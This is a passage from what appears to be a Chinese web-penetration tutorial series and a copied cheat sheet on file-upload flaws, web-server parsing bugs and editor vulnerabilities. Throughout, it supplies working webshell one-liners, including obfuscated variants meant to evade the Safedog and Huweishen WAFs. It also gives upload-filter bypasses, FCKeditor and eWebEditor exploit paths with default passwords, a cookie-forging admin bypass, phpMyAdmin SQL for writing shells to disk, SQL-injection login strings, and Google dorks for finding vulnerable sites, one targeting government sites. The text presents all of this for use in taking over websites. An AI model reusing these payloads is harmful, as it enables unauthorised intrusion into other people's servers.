<p>后缀名aa 不认识 向前解析</p>
<p>1.php 最终解析结果为PHP文件</p>
<p>这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为PHP的文件）</p>
<p>Apache认识的扩展名保存在安装目录下”/conf/mime.types”文件中。下图为本机的情况，文件在路径C:wampbinapacheApache2.2.21confmime.types</p>
<h2 id="三、PHP-CGI解析漏洞"><a href="#三、PHP-CGI解析漏洞" class="headerlink" title="三、PHP CGI解析漏洞"></a>三、PHP CGI解析漏洞</h2><p>在某些使用Nginx的网站中，</p>
<p>访问<a href="http://www.xxser.com/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。" target="_blank" rel="noopener">http://www.xxser.com/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。</a></p>
<p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。</p>
<p>这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。</p>
<p>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</p>
<h1 id="第七篇-上传漏洞之绕过上传漏洞"><a href="#第七篇-上传漏洞之绕过上传漏洞" class="headerlink" title="第七篇-上传漏洞之绕过上传漏洞"></a>第七篇-上传漏洞之绕过上传漏洞</h1><p>前一篇我们已经讲过了上传漏洞的解析漏洞,在某些时候,知道网站存在哪个解析漏洞,那么我们就可以更好的利用上传漏洞</p>
<p>这个知识点在我们前面就有粗略说过了(<a href="http://www.yuntest.org/index.php/archives/765.html)" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/765.html)</a>, http拦截也是上传漏洞的其中之一, 下面我们来对绕过上传漏洞进行更深的了解。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>管理员防止文件上传漏洞时可以分为两种,一种是客户端检测,一种是服务端检测：</p>
<p>客户端检测：使用JavaScript检测，在文件上传之前,就对文件进行验证</p>
<p>服务器端检测：服务端脚本一般会检测文件的<a href="http://www.yuntest.org/go/?url=https://wapbaike.baidu.com/item/MIME/2900607?adapt=1&amp;fr=aladdin" target="_blank" rel="noopener">MIME类型</a>（这里大家先点过去了解一下mime类型）检测文件扩展名是否合法，甚至有些程序检测文件中是否嵌入恶意代码。</p>
<p>图片一句话:</p>
<p>把一句话木马插入在图片文件中,而且并不损坏图片文件,这一方法可以躲过少许的防火墙检测。再利用解析漏洞得到webshell</p>
<p>推荐一款专业的制作软件：LEdjpgcom</p>
<h3 id="一、客户端检测绕过方法："><a href="#一、客户端检测绕过方法：" class="headerlink" title="一、客户端检测绕过方法："></a>一、客户端检测绕过方法：</h3><p>FireBug插件：将用于检验文件扩展名的onsubmit事件删除。</p>
<p>中间人攻击：使用Burp Suite,首先把木马扩展名改为一张正常图片（图片木马的简介上一篇说过了,大家可以百度加以了解）的扩展名,比如JPG扩展名，,在上传时使用Burp Suite拦截上传数据,再将其中的扩展名JPG修改为PHP，就可以绕过客户端验证。也有可能还需要相应地修改Content-Length（Http知识点,看不明白跑回去看:<a href="http://www.yuntest.org/index.php/archives/686.html" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/686.html</a>)</p>
<p>任何客户端验证都是不安全的,客户端验证是防止用户输入错误,减少服务器开销,而服务器端验证才可以真正防御攻击者。</p>
<p>注：从第一篇一直看到这里的,不理解的去面壁</p>
<h3 id="二、服务器端检测"><a href="#二、服务器端检测" class="headerlink" title="二、服务器端检测"></a>二、服务器端检测</h3><h4 id="白名单与黑名单验证"><a href="#白名单与黑名单验证" class="headerlink" title="白名单与黑名单验证"></a>白名单与黑名单验证</h4><p>黑名单过滤方法：定义不允许上传的文件扩展名</p>
<p>黑名单的绕过方法：</p>
<p>1.攻击者可以从黑名单中找到Web开发人员忽略的扩展名，如：cer</p>
<p>2.对文件的后缀名进行大小写转换，比如黑名单中有php，可以将文件的后缀改为pHp，仅限windows平台</p>
<p>3.在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”与空格，利用此特性也可以绕过黑名单验证。（asp.或asp_）</p>
<p>白名单过滤方法：定义允许上传的文件扩展名</p>
<p>白名单的绕过方法：结合Web容器的解析漏洞</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>php中通过$_FILE[‘file’][‘type’]来检验</p>
<p>绕过方法：可以在Burp Suite中更改Content-Type的内容为image/jpeg</p>
<h4 id="目录验证"><a href="#目录验证" class="headerlink" title="目录验证"></a>目录验证</h4><p>在文件上传时，程序通常允许用户将文件放到指定的目录中，如果指定的目录存在，就将文件写入目录中，不存在的话则先建立目录，然后写入。</p>
<p>比如：在前端的HTML代码中，有一个隐藏标签<input type="”hidden”" name="”Extension”" value="”up”/"></p>
<p>在服务器端有如下代码</p>
<p>if(!is_dir($Extension)){ //如果文件夹不存在，就建立文件夹</p>
<p>mkdir($Extension);</p>
<p>}</p>
<p>攻击者可以利用工具将表单中value的值由“up”改为“pentest.asp”，并上传一句话图片木马文件。</p>
<p>程序在接收到文件后，对目录判断，如果服务器不存在pentest.asp目录，将会建立此目录，然后再将图片一句话密码文件写入pentest.asp目录，如果Web容器为IIS 6.0，那么网页木马会被解析。</p>
<h4 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h4><p>在ASP程序中最常见，也就是%00将后面的字符都截断了，比如上传文件名为1.asp%00xxser.jpg。</p>
<p>实际操作过程中，利用Burp Suite的Repeater中的HEX选项卡可以进行这样的操作。</p>
<p>截断上传漏洞不仅出现在ASP程序上，在PHP、JSP程序中也存在这样的问题。</p>
<p>0x00不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截断上传漏洞。</p>
<h1 id="第八篇-上传漏洞之文本编辑器上传"><a href="#第八篇-上传漏洞之文本编辑器上传" class="headerlink" title="第八篇-上传漏洞之文本编辑器上传"></a>第八篇-上传漏洞之文本编辑器上传</h1><h2 id="Oday"><a href="#Oday" class="headerlink" title="Oday"></a>Oday</h2><p>常见的文本编辑器有CKEditor，Ewebeditor，UEditor，KindEditor，XHeditor等。其包含的功能类似，比如，图片上传、视频上传、远程下载等。</p>
<p>使用这类编辑器减少了程序开发的时间，但也存在通用性漏洞带来的危害</p>
<p>以FCKeditor（现已更名为CKEditor）为例，其存在如下漏洞</p>
<h2 id="一、敏感信息暴露"><a href="#一、敏感信息暴露" class="headerlink" title="一、敏感信息暴露"></a>一、敏感信息暴露</h2><h3 id="1-1-查看版本信息"><a href="#1-1-查看版本信息" class="headerlink" title="1.1 查看版本信息"></a>1.1 查看版本信息</h3><p>/FCKeditor/editor/dialog/fck_about.html</p>
<h3 id="1-2-默认上传页面"><a href="#1-2-默认上传页面" class="headerlink" title="1.2 默认上传页面"></a>1.2 默认上传页面</h3><p>/FCKeditor/editor/filemanager/browser/default/browser.html</p>
<p>/FCKeditor/editor/filemanager/browser/default/connectors/test.html</p>
<p>/FCKeditor/editor/filemanager/upload/test.html</p>
<p>/FCKeditor/editor/filemanager/connectors/test.html</p>
<p>/FCKeditor/editor/filemanager/connectors/uploadtest.html</p>
<h3 id="1-3-其他敏感文件"><a href="#1-3-其他敏感文件" class="headerlink" title="1.3 其他敏感文件"></a>1.3 其他敏感文件</h3><p>/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx</p>
<p>/FCKeditor/editor/filemanager/connectors/asp/connector.asp</p>
<p>/FCKeditor/editor/filemanager/connectors/php/connector.php</p>
<h2 id="二、黑名单策略错误"><a href="#二、黑名单策略错误" class="headerlink" title="二、黑名单策略错误"></a>二、黑名单策略错误</h2><p>在FCKeditor&lt;=2.4.3版本中采用的是黑名单机制，在config.asp文件中有对此黑名单的定义。</p>
<p>在这个黑名单中过滤了一些常见的文件扩展名，但疏忽了asa、cer等未知风险扩展名。</p>
<h2 id="三、任意文件上传漏洞"><a href="#三、任意文件上传漏洞" class="headerlink" title="三、任意文件上传漏洞"></a>三、任意文件上传漏洞</h2><p>在FCKeditor2.4.2及其以下的版本中，都存在任意文件上传漏洞，比如文件upload.php</p>
<p>在Burp Suite中拦截上传信息，并将请求地址改为upload.php?Type=Media上传。</p>
<p>在FCKeditor中还存在其他的漏洞，例如，ASP.NET二次上传，建立畸形文件夹等漏洞。</p>
<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>关于各种版本的FCKeditor，上传利用地址形式如下：</p>
<p>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors</p>
<p>JSP版本：/jsp/connector</p>
<p>ASP版本：/asp/connector</p>
<p>ASPX版本：/aspx/connector</p>
<p>cfm版本：/cfm/connector</p>
<p>由于FCKeditor的典型目录结构是“UserFiles/Image/”,因此，上传的WebShell地址格式为“UserFiles/Image（File或Flash）/+文件名称”。例如：<a href="http://www.x.com/UserFiles/Flash/Browser.jsp" target="_blank" rel="noopener">http://www.x.com/UserFiles/Flash/Browser.jsp</a></p>
<p>eWebEditor</p>
<p>下载eWebEditor的默认数据库文件：db/ewebeditor.mdb</p>
<p>默认后台：ewebeditor/admin_login.asp,默认用户名和密码admin/admin</p>
<p>样式管理：/system/editor/admin_style.asp</p>
<p>Dvbbs 8.2中数据库的默认地址：data/dvbbs8.mdb</p>
<h1 id="特别篇-主流网站程序Oday大全以及拿shell思路"><a href="#特别篇-主流网站程序Oday大全以及拿shell思路" class="headerlink" title="特别篇-主流网站程序Oday大全以及拿shell思路"></a>特别篇-主流网站程序Oday大全以及拿shell思路</h1><h2 id="版权和内容说明："><a href="#版权和内容说明：" class="headerlink" title="版权和内容说明："></a>版权和内容说明：</h2><p>这篇文章不是本站编写,是从网络上摘抄的,但是经过了本站的改写优化,并将内容,格式规范化。</p>
<p>本篇说明：这篇文章结合了前辈们前几年一路挖掘出来的主流程序漏洞以及<a href="http://www.yuntest.org/archives/tag/si-lu/" target="_blank" rel="noopener">思路</a>, 小编写在前面是想让大家大致了解一下,因为《<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>课程》以后的内容,就是围绕着本篇所涉及的内容进行深度逻辑原理剖析。</p>
<p>这是一篇比较完全的基本渗透笔记。看不懂没关系,后面会一一讲解不过本章的内容读者们要尽量保存,可能会在拿站的时候应用到呢！</p>
<h2 id="常见网站程序asp类："><a href="#常见网站程序asp类：" class="headerlink" title="常见网站程序asp类："></a>常见网站程序asp类：</h2><p>foosun(风讯)</p>
<p>kesion(科汛)</p>
<p>newasp(新云)</p>
<p>乔客CreateLive(创力)</p>
<p>5uCMSKingCMS</p>
<p>DvBBS(动网)</p>
<p>BBSxp[博客]zblog</p>
<h2 id="PHP类："><a href="#PHP类：" class="headerlink" title="PHP类："></a>PHP类：</h2><p>DeDeCms（织梦）</p>
<p>ECMS（帝国）</p>
<p>PHPCMS</p>
<p>PHP168</p>
<p>HBcms（宏博）SupeSite</p>
<p>CMSware(思维)Joomla!</p>
<p>[BBS]Discuz!</p>
<p>[BBS]phpWind[SNS]UCenterHome</p>
<p>[SNS]ThinkSNS[商城]EcShop</p>
<p>[商城]ShopEx[博客]WordPress</p>
<p>[维基]HDWiki</p>
<p>[微博]PHPsay[DIGG]PBdigg</p>
<h2 id="PHP程序来源默认绝对路径"><a href="#PHP程序来源默认绝对路径" class="headerlink" title="PHP程序来源默认绝对路径"></a>PHP程序来源默认绝对路径</h2><p>开源系统 数据库配置文件名 文件名所在的目录</p>
<p>Discuz! config.inc.php ./ config.inc.php</p>
<p>Phpcms config.inc.php ./include/config.inc.php</p>
<p>Wodpress wp-config.php ./ wp-config.php</p>
<p>Phpwind sqlconfig.php ./data/sqlconfig.php</p>
<p>phpweb config.inc.php ./config.inc.php</p>
<p>Php168v6 mysql_config.php ./php168/ mysql_config.php</p>
<p>Shopex config.php ./config/config.php</p>
<p>Ecshop config.php ./data/config.php</p>
<p>Joomla configuration.php ./ configuration.php</p>
<p>UCenter config.inc.php ./data/config.inc.php</p>
<p>EmpireCMS config.php ./e/class/config.php</p>
<p>Dedecms common.inc.php .data/common.inc.php</p>
<p>Zen Cart configure.php ./includes/configure.php</p>
<p>Mediawiki localsettints.php ./config/localsettints.php</p>
<p>Ecshop config.php ./data/config.php</p>
<p>osCommerce configure.php ./includes/configure.php</p>
<h2 id="【-谷歌语法-】"><a href="#【-谷歌语法-】" class="headerlink" title="【 谷歌语法 】"></a>【 谷歌语法 】</h2><p>site：可以限制你搜索范围的域名.</p>
<p>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</p>
<p>intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)</p>
<p>intitle: 查包含关键词的页面，一般用于<a href="http://www.yuntest.org/archives/tag/she-gong/" target="_blank" rel="noopener">社工</a>别人的webshell密码</p>
<p>filetype：搜索文件的后缀或者扩展名</p>
<p>intitle：限制你搜索的网页标题.</p>
<p>link: 可以得到一个所有包含了某个指定URL的页面列表.</p>
<p>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p>
<p>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p>
<p>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p>
<p>查找上传漏洞：site:域名 inurl:file|load|editor|Files</p>
<p>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
<p>存在的数据库：site:域名 filetype:mdb|asp|#</p>
<p>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p>
<p>迂回策略入侵：inurl:cms/data/templates/images/index/</p>
<p>网络设备关键词：intext:WEB Management Interface for H3C SecPath Series</p>
<h2 id="【-一句话木马-】"><a href="#【-一句话木马-】" class="headerlink" title="【 一句话木马 】"></a>【 一句话木马 】</h2><p>asp一句话木马：&lt;%eval request(“x”)%&gt;</p>
<p>php一句话木马：</p>
<p>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;</p>
<p>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;</p>
<p>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;</p>
<p>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;</p>
<p>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%</p>
<p>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</p>
<p>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;</p>
<p>elong过安全狗的php一句话：</p>
<p>后台常用写入php一句话（密码x）：</p>
<p>&lt;?</p>
<p>$fp = @fopen(“c.php”, ‘a’);</p>
<p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[x])’.”rnrn?”.”&gt;rn”);</p>
<p>@fclose($fp);</p>
<p>?&gt;</p>
<p>高强度php一句话：</p>
<p>新型变异PHP一句话(密码b4dboy):</p>
<p>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</p>
<p>突破安全狗的aspx一句话：&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;</p>
<p>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;</p>
<p>突破护卫神，保护盾一句话：</p>
<p>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。</p>
<p>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉</p>
<p>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。</p>
<p>PHP高强度一句话：</p>
<p>菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c</p>
<p>菜刀连接 躲避检测 密码：c</p>
<p>##【 解析漏洞总结 】</p>
<p>IIS 6.0</p>
<p>目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码IIS6.0 会将 xx.jpg 解析为 asp 文件。</p>
<p>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)</p>
<p>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。</p>
<p>默认解析：/xx.asa /xx.cer /xx.cdx</p>
<p>IIS6.0 默认的可执行文件除了 asp 还包含这三种</p>
<p>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg</p>
<p>IIS 7.0/ IIS 7.5/ Nginx &lt;8.03</p>
<p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p>
<p>e.g.</p>
<p>copy xx.jpg/b + yy.txt/a xy.jpg</p>
<p>/b 即二进制[binary]模式</p>
<p>/a 即ascii模式 xx.jpg正常图片文件</p>
<p>yy.txt 内容 ’);?&gt;</p>
<p>意思为写入一个内容为 名称为shell.php的文件</p>
<p>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
<p>.然后就在图片目录下生成一句话木马 shell.php 密码 cmd</p>
<h2 id="【-ewebeditor编辑器-】"><a href="#【-ewebeditor编辑器-】" class="headerlink" title="【 ewebeditor编辑器 】"></a>【 ewebeditor编辑器 】</h2><p>默认后台：ewebeditor/admin_login.asp</p>
<p>帐号密码：admin admin</p>
<p>样式设计：ewebeditor/admin_style.asp</p>
<p>查看版本：ewebeditor/dialog/about.html</p>
<p>数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)</p>
<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..</p>
<p>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..</p>
<p>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)</p>
<h2 id="ewebeditor5-5版本"><a href="#ewebeditor5-5版本" class="headerlink" title="( ewebeditor5.5版本 )"></a>( ewebeditor5.5版本 )</h2><p>默认后台：ewebeditor/admin/login.asp</p>
<p>帐号密码：admin 198625</p>
<p>数据库路径：data/%23sze7xiaohu.mdb</p>
<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../</p>
<p>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup</p>
<p>( ewebeditor3.8 php版本 )</p>
<p>默认后台：eWebEditor/admin/login.php</p>
<p>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：</p>
<p>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));</p>
<p>接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。</p>
<p>( ewebeditor编辑器exp手册 )</p>
<p>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试</p>
<p>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg</p>
<p>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</p>
<p>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用<a href="http://www.yuntest.org/archives/tag/gong-ju/" target="_blank" rel="noopener">工具</a>浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</p>
<h2 id="【-fckeditor编辑器-】"><a href="#【-fckeditor编辑器-】" class="headerlink" title="【 fckeditor编辑器 】"></a>【 fckeditor编辑器 】</h2><p>查看版本：fckeditor/editor/dialog/fck_about.html</p>
<p>编辑器页面：FCKeditor/_samples/default.html</p>
<p>上传页面：fckeditor/editor/filemanager/connectors/test.html</p>
<p>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/</p>
<p>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
<p>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=</p>
<p><strong>( 拿shell方法总结 )</strong></p>
<p>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。</p>
<p>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell</p>
<p>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg</p>
<p>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx</p>
<p>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次</p>
<p>五：成功访问别人的一句话木马页面，<a href="http://xx.com/UploadFilesEditorFilefile/2.asp;2(1).jpg" target="_blank" rel="noopener">http://xx.com/UploadFilesEditorFilefile/2.asp;2(1).jpg</a> 但不知道密码</p>
<p><a href="http://xx.com/UploadFilesEditorFilefile2_asp;2.jpg" target="_blank" rel="noopener">http://xx.com/UploadFilesEditorFilefile2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。</p>
<p>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：<a href="http://www.xxx.com/iges/php.jpg/.php" target="_blank" rel="noopener">http://www.xxx.com/iges/php.jpg/.php</a></p>
<p>( 建立文件夹 . 变 _ 的突破方法 )</p>
<p>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。</p>
<p>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！</p>
<p>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html</p>
<p>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”</p>
<p>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp</p>
<p>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探</p>
<p>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp</p>
<p>6.然后点击右侧的：run to completion</p>
<p>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</p>
<h2 id="【-linux-】"><a href="#【-linux-】" class="headerlink" title="【 linux 】"></a>【 linux 】</h2><p>解析格式：1.php.xxx (xxx可以是任意)</p>
<p>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>当做PHP脚本解析。</p>
<p>辨别linux系统方法：例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="noopener">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.</p>
<h2 id="【-旁注-】"><a href="#【-旁注-】" class="headerlink" title="【 旁注 】"></a>【 旁注 】</h2><p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="noopener">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx</p>
<p>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
<h2 id="【-phpmyadmin-】"><a href="#【-phpmyadmin-】" class="headerlink" title="【 phpmyadmin 】"></a>【 phpmyadmin 】</h2><p>查看版本：test.php 或 phpinfo.php</p>
<p>默认账号密码：root root</p>
<p>万能帐号密码：’localhost’@’@” 密码空</p>
<p>拿shell第一种方法：</p>
<p>CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );</p>
<p>INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘’);</p>
<p>SELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;</p>
<p>DROP TABLE IF EXISTS darkmoon;</p>
<p>拿shell第二种方法：</p>
<p>Create TABLE moon (darkmoon text NOT NULL);</p>
<p>Insert INTO moon (darkmoon) VALUES(‘’);</p>
<p>select darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;</p>
<p>Drop TABLE IF EXISTS moon;</p>
<p>拿shell第三种方法：</p>
<p>select ‘’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’</p>
<p>拿shell第四种方法</p>
<p>select ‘’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’</p>
<p>127.0.0.1/darkmoon4.php?cmd=net user</p>
<p>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。</p>
<h3 id="phpmyadmin脱裤"><a href="#phpmyadmin脱裤" class="headerlink" title="phpmyadmin脱裤"></a>phpmyadmin脱裤</h3><p>在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。</p>
<p>修改mysql默认的root用户名方法:</p>
<p>进入phpmyadmin,进入mysql表,执行sql语句</p>
<p>1.update user set user=’你的新root用户名’ where user=’root’;</p>
<p>2.flush privileges;</p>
<p>例如：</p>
<p>用root身份登入，进入mysql库，修改user表即可。</p>
<p>1.use mysql;</p>
<p>2.mysql&gt;update user set user=’newName’ where user=’root’;</p>
<p>3.mysql&gt; flush privileges;</p>
<h3 id="【-万能密码-】"><a href="#【-万能密码-】" class="headerlink" title="【 万能密码 】"></a>【 万能密码 】</h3><p>( php )</p>
<p>帐号：’ UNION Select 1,1,1 FROM admin Where ”=’</p>
<p>密码：1</p>
<p>( asp )</p>
<p>‘xor</p>
<p>‘or’=’or’</p>
<p>‘or”=”or”=’</p>
<p>‘or ‘1’=’1’or ‘1’=’1</p>
<p>‘or 1=1/*</p>
<h3 id="【-批量关键词-】"><a href="#【-批量关键词-】" class="headerlink" title="【 批量关键词 】"></a>【 批量关键词 】</h3><p>inurl:asp?id=</p>
<p>inurl:detail.php?</p>
<p>CompHonorBig.asp?id= 很不错的的一个搜索注入点</p>
<p>inurl:show.asp? 非常强大</p>
<p>site:<a href="http://www.yuming.com" target="_blank" rel="noopener">www.yuming.com</a></p>
<p>inurl:articleshow.asp?articleid=数字</p>
<p>inurl:szwyadmin/login.asp</p>
<p>inurl:asp?id=1 intitle:政府</p>
<p>杭州 inurl:Article_Class2.asp?</p>
<h3 id="【-木马后门-】"><a href="#【-木马后门-】" class="headerlink" title="【 木马后门 】"></a>【 木马后门 】</h3><p>1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。</p>
<p>2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码</p>
<p>3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk</p>
<h3 id="【-安全狗-】"><a href="#【-安全狗-】" class="headerlink" title="【 安全狗 】"></a>【 安全狗 】</h3><h4 id="1-过注入"><a href="#1-过注入" class="headerlink" title="1.过注入"></a>1.过注入</h4><p>方法一：a.asp?aaa=%00&amp;id=sql语句</p>
<p>方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin</p>
<h4 id="2-过大马被阻拦访问"><a href="#2-过大马被阻拦访问" class="headerlink" title="2.过大马被阻拦访问"></a>2.过大马被阻拦访问</h4><p>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="noopener">http://sss.com/dama.asp</a> ; 访问后出现拦截。</p>
<p>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。</p>
<h4 id="3-过菜刀连接一句话被拦截"><a href="#3-过菜刀连接一句话被拦截" class="headerlink" title="3.过菜刀连接一句话被拦截"></a>3.过菜刀连接一句话被拦截</h4><p>方法一：不用菜刀连接一句话，用别的一句话连接端。</p>
<p>方法二：中转下连接菜刀，把过滤掉的词替换掉。</p>
<h3 id="【-本地构造上传漏洞-】"><a href="#【-本地构造上传漏洞-】" class="headerlink" title="【 本地构造上传漏洞 】"></a>【 本地构造上传漏洞 】</h3><p>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：</p>
